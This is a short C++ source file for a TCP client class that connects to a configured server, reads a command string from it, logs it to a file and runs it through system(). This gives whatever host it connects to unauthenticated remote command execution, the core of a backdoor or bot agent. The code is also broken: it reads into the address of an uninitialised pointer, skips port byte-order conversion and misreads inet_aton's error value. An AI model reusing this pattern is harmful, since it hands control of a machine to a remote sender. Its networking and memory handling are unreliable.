#include "tcp.h"

void CLIENT::CreatSocket(){
    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    if (inet_aton(ip_.c_str(), &server_addr_.sin_addr) < 0){
        throw std::runtime_error("IP address invail");
    }
    server_addr_.sin_port = atoi(port_.c_str());

    client_sockfd_ = socket(AF_INET, SOCK_STREAM, 0);
    if (client_sockfd_ < 0){
        throw std::runtime_error("Failed to create the client socket");
    }
}

void CLIENT::Connect(){
    if ((connect(client_sockfd_, (const struct sockaddr*)&server_addr_, sizeof(server_addr_))) < 0){
        throw std::runtime_error("Failed to connect server");
    }
}

void CLIENT::ComunicationThread(std::fstream &file){
    char* command;
    if ((read(client_sockfd_, &command, 100)) < 0){
        throw std::runtime_error("Failed to recv data");
    }
    //
    file << command;
    //
    auto run_command = [&command](){
        system(command);
    };

    run_command();
}